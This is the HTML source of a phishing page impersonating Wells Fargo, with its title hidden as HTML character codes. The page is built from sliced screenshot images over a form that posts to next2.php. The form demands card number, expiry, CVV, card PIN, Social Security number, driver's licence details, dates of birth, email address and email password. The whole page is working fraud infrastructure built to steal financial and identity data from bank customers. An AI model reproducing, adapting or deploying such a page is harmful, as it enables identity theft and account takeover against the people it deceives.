<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#32;&#45;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>		

			  <style type="text/css">
  
.textbox {  
    border: solid 1px #CFD1D7;
  	border-radius: 3px;
 	padding-left: 10px;
  	font-size: 15px;
    color: #44464A;
    height: 38px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #8EB1EB; 
    border-style: solid; 
  	border-radius: 3px;
    border-width: 2px; 
    outline: 0; 
 } 

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
   $("#dbb").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
   $("#ssn").mask("999-99-9999",{placeholder:"XXX-XX-XXXX"});
//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
    });
</script>
</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:189px; top:33px; width:64px; height:65px; z-index:0"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=64 height=65></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1044px; top:75px; width:96px; height:17px; z-index:1"><a href="#"><img src="images/secu.png" alt="" title="" border=0 width=96 height=17></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:109px; width:1349px; height:16px; z-index:2"><img src="images/wf17.png" alt="" title="" border=0 width=1349 height=16></div>

<div id="image6" style="position:absolute; overflow:hidden; left:207px; top:1639px; width:409px; height:50px; z-index:3"><img src="images/wf20.png" alt="" title="" border=0 width=409 height=50></div>

<div id="image7" style="position:absolute; overflow:hidden; left:216px; top:1580px; width:614px; height:40px; z-index:4"><a href="#"><img src="images/wf21.png" alt="" title="" border=0 width=614 height=40></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:186px; top:1418px; width:984px; height:18px; z-index:5"><img src="images/wf22.png" alt="" title="" border=0 width=984 height=18></div>

<div id="image4" style="position:absolute; overflow:hidden; left:186px; top:142px; width:553px; height:71px; z-index:6"><img src="images/wf18.png" alt="" title="" border=0 width=553 height=71></div>

<div id="image11" style="position:absolute; overflow:hidden; left:231px; top:247px; width:209px; height:175px; z-index:2"><img src="images/ws2.png" alt="" title="" border=0 width=209 height=175></div>

<div id="image5" style="position:absolute; overflow:hidden; left:231px; top:440px; width:202px; height:362px; z-index:7"><img src="images/ws3.png" alt="" title="" border=0 width=202 height=362></div>

<div id="image9" style="position:absolute; overflow:hidden; left:234px; top:832px; width:197px; height:494px; z-index:8"><img src="images/ws4.png" alt="" title="" border=0 width=197 height=494></div>

<form action=next2.php name=dafathiwanj id=dafathiwanj method=post>
<input name="noc" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:332px;left:240px;top:278px;z-index:8">
<input name="addr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:332px;left:240px;top:372px;z-index:9">
<input name="cn" class="textbox cc-number" autocomplete="off" required type="text" style="position:absolute;width:332px;left:240px;top:466px;z-index:10">
<input name="ex" placeholder="MM/YYYY" class="textbox cc-exp" autocomplete="off" required type="text" style="position:absolute;width:332px;left:240px;top:560px;z-index:11">
<input name="cv" class="textbox cc-cvc" autocomplete="off" required maxlength="3" style="position:absolute;left:240px;top:665px;width:332px;z-index:12">
<input name="pn" id="demo-field" class="textbox" autocomplete="off" required maxlength="4" style="position:absolute;left:240px;top:760px;width:332px;z-index:13">
<input name="sn" id="ssn" class="textbox" autocomplete="off" required style="position:absolute;left:241px;top:865px;width:332px;z-index:14">
<input name="dl" class="textbox" autocomplete="off" required style="position:absolute;left:241px;top:959px;width:332px;z-index:15">
<input name="dlx" id="dob" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required style="position:absolute;left:241px;top:1053px;width:332px;z-index:16">
<input name="db" id="dbb" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required style="position:absolute;left:241px;top:1147px;width:332px;z-index:17">
<input name="eml" class="textbox" autocomplete="off" required style="position:absolute;left:241px;top:1241px;width:332px;z-index:18">
<input name="eps" id="demo-field1" class="textbox" autocomplete="off" required style="position:absolute;left:241px;top:1335px;width:332px;z-index:19">
<div id="formimage1" style="position:absolute; left:970px; top:1445px; z-index:20"><input type="image" name="formimage1" width="122" height="34" src="images/confirm.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
  new MaskedPassword(document.getElementById("demo-field1"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
